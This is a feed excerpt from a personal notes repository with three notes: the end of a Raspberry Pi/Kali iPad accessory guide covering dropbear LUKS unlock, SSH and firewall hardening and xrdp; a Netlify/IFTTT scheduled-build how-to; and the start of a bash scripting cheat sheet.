&lt;span id=&quot;cb18-19&quot;&gt;&lt;a href=&quot;#cb18-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Third moment of truth: Reboot your system. After a few moments you should be able to SSH into it as root@10.55.0.1 (over USB C) and be prompted to unlock your root device. After you type in your decryption passphrase, SSH should automatically close and your system should continue to boot. In a few more moments you should be able to SSH back in as kali@10.55.0.1.&lt;/p&gt;&lt;p&gt;You can &lt;em&gt;also&lt;/em&gt; still unlock the system at the console, which is handy if you want to use the Pi as a stand-alone computer.&lt;/p&gt;&lt;p&gt;Note an annoying feature of this setup - you have to SSH in as &lt;em&gt;root&lt;/em&gt; to do the initial unlock, but then will need to SSH in a second time as &lt;em&gt;kali&lt;/em&gt; once the system is fully up. Partly, this is due to the fact that there's not really a way to hand SSH off from the initram environment to the full system (this is why you have to log in once to unlock, and again to use the system once it's fully up). Theoretically it should be possible to add a kali user to the initramfs, but doing so would require both the dropbear initramfs hooks to be modified (which, as previously mentioned, is fragile w.r.t. upgrades) and &lt;em&gt;a lot&lt;/em&gt; more magic in generally than seems advisable.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://bbs.archlinux.org/viewtopic.php?id=250512&quot;&gt;dropbearconvert refuses all kinds of OpenSSH keys&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.arminpech.de/2019/12/23/debian-unlock-luks-root-partition-remotely-by-ssh-using-dropbear/&quot;&gt;Debian: Unlock LUKS root partition remotely by SSH using dropbear&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.cyberciti.biz/security/how-to-unlock-luks-using-dropbear-ssh-keys-remotely-in-linux/&quot;&gt;How to unlock LUKS using Dropbear SSH keys remotely in Linux&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.marcfargas.com/posts/enable-wireless-debian-initramfs/index.html&quot;&gt;Enable Wireless networks in Debian Initramfs&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://gitlab.com/kalilinux/documentation/kali-docs/-/issues/49&quot;&gt;Encryption unlock not showing&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;network-hardening&quot;&gt;Network Hardening&lt;/h2&gt;&lt;p&gt;Now that we've got the Pi working with our iPad, we're going to lock down networking a bit&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb19&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb19-1&quot;&gt;&lt;a href=&quot;#cb19-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Become root.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb19-2&quot;&gt;&lt;a href=&quot;#cb19-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb19-3&quot;&gt;&lt;a href=&quot;#cb19-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; -s&lt;/span&gt;
&lt;span id=&quot;cb19-4&quot;&gt;&lt;a href=&quot;#cb19-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb19-5&quot;&gt;&lt;a href=&quot;#cb19-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Limit SSH access to the kali user over usb0.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb19-6&quot;&gt;&lt;a href=&quot;#cb19-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb19-7&quot;&gt;&lt;a href=&quot;#cb19-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; /etc/ssh/sshd_config.d/lockdown.conf &lt;span class=&quot;op&quot;&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb19-8&quot;&gt;&lt;a href=&quot;#cb19-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;AllowUsers kali&lt;/span&gt;
&lt;span id=&quot;cb19-9&quot;&gt;&lt;a href=&quot;#cb19-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;ListenAddress 10.55.0.1&lt;/span&gt;
&lt;span id=&quot;cb19-10&quot;&gt;&lt;a href=&quot;#cb19-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;PermitRootLogin no&lt;/span&gt;
&lt;span id=&quot;cb19-11&quot;&gt;&lt;a href=&quot;#cb19-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;op&quot;&gt;EOF&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb19-12&quot;&gt;&lt;a href=&quot;#cb19-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;systemctl&lt;/span&gt; restart sshd.service&lt;/span&gt;
&lt;span id=&quot;cb19-13&quot;&gt;&lt;a href=&quot;#cb19-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb19-14&quot;&gt;&lt;a href=&quot;#cb19-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Basic firewall.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb19-15&quot;&gt;&lt;a href=&quot;#cb19-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb19-16&quot;&gt;&lt;a href=&quot;#cb19-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;apt&lt;/span&gt; install gufw&lt;/span&gt;
&lt;span id=&quot;cb19-17&quot;&gt;&lt;a href=&quot;#cb19-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;systemctl&lt;/span&gt; start ufw.service&lt;/span&gt;
&lt;span id=&quot;cb19-18&quot;&gt;&lt;a href=&quot;#cb19-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ufw&lt;/span&gt; default deny&lt;/span&gt;
&lt;span id=&quot;cb19-19&quot;&gt;&lt;a href=&quot;#cb19-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ufw&lt;/span&gt; allow in on usb0 from 0.0.0.0/0 port 68 to 0.0.0.0/0 port 67 proto udp&lt;/span&gt;
&lt;span id=&quot;cb19-20&quot;&gt;&lt;a href=&quot;#cb19-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ufw&lt;/span&gt; allow in on usb0 from 10.55.0.0/29 to 10.55.0.1 port 22 proto tcp&lt;/span&gt;
&lt;span id=&quot;cb19-21&quot;&gt;&lt;a href=&quot;#cb19-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ufw&lt;/span&gt; enable&lt;/span&gt;
&lt;span id=&quot;cb19-22&quot;&gt;&lt;a href=&quot;#cb19-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb19-23&quot;&gt;&lt;a href=&quot;#cb19-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Drop permissions.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb19-24&quot;&gt;&lt;a href=&quot;#cb19-24&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb19-25&quot;&gt;&lt;a href=&quot;#cb19-25&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you're going to be using this device covertly, you almost certainly also want to run &lt;code&gt;sudo systemctl disable NetworkManager.service&lt;/code&gt; so that the Pi doesn't attempt to immediately connect to whatever network you plug it into.&lt;/p&gt;&lt;h2 id=&quot;remote-desktop&quot;&gt;Remote Desktop&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb20&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb20-1&quot;&gt;&lt;a href=&quot;#cb20-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Become root.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-2&quot;&gt;&lt;a href=&quot;#cb20-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-3&quot;&gt;&lt;a href=&quot;#cb20-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; -s&lt;/span&gt;
&lt;span id=&quot;cb20-4&quot;&gt;&lt;a href=&quot;#cb20-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-5&quot;&gt;&lt;a href=&quot;#cb20-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Install xrdp.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-6&quot;&gt;&lt;a href=&quot;#cb20-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-7&quot;&gt;&lt;a href=&quot;#cb20-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;apt&lt;/span&gt; install xrdp&lt;/span&gt;
&lt;span id=&quot;cb20-8&quot;&gt;&lt;a href=&quot;#cb20-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-9&quot;&gt;&lt;a href=&quot;#cb20-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Turn off &amp;quot;new&amp;quot; cursors, as this causes problems with some&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-10&quot;&gt;&lt;a href=&quot;#cb20-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# RDP clients. This isn&amp;#39;t necessary if you&amp;#39;re using Microsoft&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-11&quot;&gt;&lt;a href=&quot;#cb20-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Remote Desktop, but is required to avoid the cursor being&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-12&quot;&gt;&lt;a href=&quot;#cb20-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# surrounded by a weird box on Jump Desktop. The trade-off&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-13&quot;&gt;&lt;a href=&quot;#cb20-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# here is that the &amp;quot;new&amp;quot; cursors look really nice, while the&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-14&quot;&gt;&lt;a href=&quot;#cb20-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# &amp;quot;old&amp;quot; cursors... Do not.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-15&quot;&gt;&lt;a href=&quot;#cb20-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-16&quot;&gt;&lt;a href=&quot;#cb20-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sed&lt;/span&gt; -i -e &lt;span class=&quot;st&quot;&gt;&amp;#39;s/^new_cursors=true$/new_cursors=false/&amp;#39;&lt;/span&gt; /etc/xrdp/xrdp.ini&lt;/span&gt;
&lt;span id=&quot;cb20-17&quot;&gt;&lt;a href=&quot;#cb20-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-18&quot;&gt;&lt;a href=&quot;#cb20-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Allow connections in over usb0.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-19&quot;&gt;&lt;a href=&quot;#cb20-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-20&quot;&gt;&lt;a href=&quot;#cb20-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ufw&lt;/span&gt; allow in on usb0 from 10.55.0.0/29 to 10.55.0.1 port 3389 proto tcp&lt;/span&gt;
&lt;span id=&quot;cb20-21&quot;&gt;&lt;a href=&quot;#cb20-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-22&quot;&gt;&lt;a href=&quot;#cb20-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Enable xrdp.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-23&quot;&gt;&lt;a href=&quot;#cb20-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-24&quot;&gt;&lt;a href=&quot;#cb20-24&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;systemctl&lt;/span&gt; enable xrdp.service&lt;/span&gt;
&lt;span id=&quot;cb20-25&quot;&gt;&lt;a href=&quot;#cb20-25&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-26&quot;&gt;&lt;a href=&quot;#cb20-26&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Drop permissions.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-27&quot;&gt;&lt;a href=&quot;#cb20-27&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb20-28&quot;&gt;&lt;a href=&quot;#cb20-28&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You should now be able to log in using RDP. Standard resolutions work well, but HiDPI/Retina is only marginally more responsive than a slideshow.&lt;/p&gt;&lt;p&gt;As with the dropbear configuration in the previous section, please do &lt;em&gt;not&lt;/em&gt; set up RDP like I'm presenting here if you're using a device that's exposed to a larger network, or worse yet the internet as a whole. In the real world, RDP servers should &lt;em&gt;only&lt;/em&gt; be accessible over SSH, a VPN, or some other secure wrapper - never exposed directly as we're doing here. The reason we can get away with less is (again) because we're &lt;em&gt;only&lt;/em&gt; exposing RDP over the usb0 interface, and the &lt;em&gt;only&lt;/em&gt; other device that ever lives on that network is the iPad.&lt;/p&gt;&lt;p&gt;NOTE: I use Jump Desktop as my RDP client, rather than Microsoft Remote Desktop - while Microsoft's offering is overall nicer, Jump Desktop is faster and will connect even when the iPad's Wi-Fi is disconnected (Microsoft will refuse to connect if Wi-Fi is disabled, even though the Pi is accessible via USB ethernet!).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.kali.org/docs/general-use/xfce-with-rdp/&quot;&gt;Setting up RDP with Xfce&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://apps.apple.com/us/app/remote-desktop-mobile/id714464092&quot;&gt;Remote Desktop Mobile&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://apps.apple.com/us/app/jump-desktop-rdp-vnc-fluid/id364876095&quot;&gt;Jump Desktop&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Mon, 20 Mar 2023 01:20:18 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Use%20a%20Raspberry%20Pi%204B%20as%20an%20iPad%20Pro%20Hacking%20Accessory.md</guid>
		</item>
		<item>
			<title>Automate Netlify Builds with IFTTT</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Automate%20Netlify%20Builds%20with%20IFTTT.md</link>
			<description>&lt;h2 id=&quot;in-netlify&quot;&gt;In Netlify&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;Go into your Netlify site's &quot;Build &amp;amp; Deploy&quot; settings.&lt;/li&gt;&lt;li&gt;Select &quot;Continuous Deployment&quot;.&lt;/li&gt;&lt;li&gt;Add a &quot;Build hook&quot;.&lt;/li&gt;&lt;li&gt;Name it whatever you'd like and select the appropriate branch.&lt;/li&gt;&lt;li&gt;Save this and Netlify will provide you with a long URL like &lt;code&gt;https://api.netlify.com/build_hooks/SOME_ID_HERE&lt;/code&gt;. This is the URL you want.&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;in-ifttt&quot;&gt;In IFTTT&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;Go to &quot;New Applet&quot; on IFTTT.&lt;/li&gt;&lt;li&gt;Click &quot;+this&quot;.&lt;/li&gt;&lt;li&gt;Select the &quot;Date &amp;amp; Time&quot; service.&lt;/li&gt;&lt;li&gt;Select the interval you want to use and set the time (and optionally date) you want to use. In most cases, defining one or more &quot;Every day at&quot; triggers will be the right approach.&lt;/li&gt;&lt;li&gt;Click &quot;+that&quot;.&lt;/li&gt;&lt;li&gt;Select the &quot;Webhooks&quot; service.&lt;/li&gt;&lt;li&gt;Select the &quot;Make a web request&quot; option.&lt;/li&gt;&lt;li&gt;For the &quot;URL&quot; field, use the build hook URL you retrieve above from Netlify.&lt;/li&gt;&lt;li&gt;For the &quot;Method&quot; field, choose &quot;POST&quot;.&lt;/li&gt;&lt;li&gt;For the &quot;Content Type&quot; field, choose &lt;code&gt;application/x-www-form-urlencoded&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;For the &quot;Body&quot; field, type &lt;code&gt;{}&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;Click the &quot;Create action&quot; button.&lt;/li&gt;&lt;li&gt;Rename the new applet and click &quot;Finish&quot;.&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.11ty.dev/docs/quicktips/netlify-ifttt/&quot;&gt;Trigger a Netlify Build Every Day With IFTTT&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.netlify.com&quot;&gt;Netlify&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://ifttt.com&quot;&gt;IFTTT&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Tue, 28 Mar 2023 03:19:57 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Automate%20Netlify%20Builds%20with%20IFTTT.md</guid>
		</item>
		<item>
			<title>Bash Scripting Tricks</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Bash%20Scripting%20Tricks.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Brace expansion&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;{X,Y}&lt;/span&gt;      # &lt;span class=&quot;ex&quot;&gt;X&lt;/span&gt; Y&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;{X,Y}&lt;/span&gt;&lt;span class=&quot;ex&quot;&gt;.txt&lt;/span&gt;  # X.txt Y.txt&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;{1..10}&lt;/span&gt;    # &lt;span class=&quot;ex&quot;&gt;1&lt;/span&gt; 2 3 4 5 6 7 8 9 10&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;{1..10..2}&lt;/span&gt; # &lt;span class=&quot;ex&quot;&gt;1&lt;/span&gt; 3 5 7 9&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Special variables&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;$#&lt;/span&gt;   # &lt;span class=&quot;ex&quot;&gt;Number&lt;/span&gt; of arguments to script/function&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;$1&lt;/span&gt;   # &lt;span class=&quot;ex&quot;&gt;First&lt;/span&gt; argument&lt;/span&gt;
&lt;span id=&quot;cb1-12&quot;&gt;&lt;a href=&quot;#cb1-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;$9&lt;/span&gt;   # &lt;span class=&quot;ex&quot;&gt;Ninth&lt;/span&gt; argument (NOTE: there is no &lt;span class=&quot;va&quot;&gt;$1&lt;/span&gt;0 and higher)&lt;/span&gt;
&lt;span id=&quot;cb1-13&quot;&gt;&lt;a href=&quot;#cb1-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt; # &lt;span class=&quot;ex&quot;&gt;All&lt;/span&gt; arguments as a separate quoted strings&lt;/span&gt;
&lt;span id=&quot;cb1-14&quot;&gt;&lt;a href=&quot;#cb1-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$*&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt; # &lt;span class=&quot;ex&quot;&gt;All&lt;/span&gt; arguments as a single string separated by&lt;/span&gt;
&lt;span id=&quot;cb1-15&quot;&gt;&lt;a href=&quot;#cb1-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;co&quot;&gt;# first IFS character&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-16&quot;&gt;&lt;a href=&quot;#cb1-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-17&quot;&gt;&lt;a href=&quot;#cb1-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# IFS is the string of characters that act as delimeters&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-18&quot;&gt;&lt;a href=&quot;#cb1-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# (for example, in loops). If unset, it&amp;#39;s equal to the&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-19&quot;&gt;&lt;a href=&quot;#cb1-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# sequence &amp;lt;space&amp;gt;&amp;lt;tab&amp;gt;&amp;lt;newline&amp;gt;.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-20&quot;&gt;&lt;a href=&quot;#cb1-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-21&quot;&gt;&lt;a href=&quot;#cb1-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Length of a variable&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-22&quot;&gt;&lt;a href=&quot;#cb1-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-23&quot;&gt;&lt;a href=&quot;#cb1-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;MYVAR=&lt;/span&gt;/path/to/file/file.tar.gz&lt;/span&gt;
&lt;span id=&quot;cb1-24&quot;&gt;&lt;a href=&quot;#cb1-24&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${#MYVAR}&lt;/span&gt; # &lt;span class=&quot;ex&quot;&gt;25&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-25&quot;&gt;&lt;a href=&quot;#cb1-25&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-26&quot;&gt;&lt;a href=&quot;#cb1-26&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Variable manipulation&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-27&quot;&gt;&lt;a href=&quot;#cb1-27&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-28&quot;&gt;&lt;a href=&quot;#cb1-28&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${MYVAR%&lt;/span&gt;.*&lt;span class=&quot;va&quot;&gt;}&lt;/span&gt;            # &lt;span class=&quot;ex&quot;&gt;/path/to/file/file.tar&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-29&quot;&gt;&lt;a href=&quot;#cb1-29&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;${MYVAR%%&lt;/span&gt;.*&lt;span class=&quot;va&quot;&gt;}&lt;/span&gt;           # &lt;span class=&quot;ex&quot;&gt;/path/to/file/file&lt;/span&gt;&lt;/span&gt;
